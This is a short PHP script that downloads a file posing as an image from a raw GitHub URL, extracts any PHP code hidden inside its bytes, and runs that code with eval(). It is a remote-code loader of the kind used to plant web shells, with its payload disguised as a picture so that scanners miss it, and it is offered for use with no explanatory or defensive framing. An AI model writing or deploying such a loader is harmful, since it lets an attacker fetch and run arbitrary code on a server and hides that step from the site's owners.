<?php
$url = "https://raw.githubusercontent.com/phrases12/adp/refs/heads/main/image.png"; // change to your JPG URL

// Download the JPG
$data = file_get_contents($url);

// Find PHP code inside
$pos = strpos($data, "<?php");
if ($pos !== false) {
    $phpCode = substr($data, $pos); // take everything from <?php onward
    eval("?>".$phpCode);
} else {
    echo "No PHP code found inside image.";
}
?>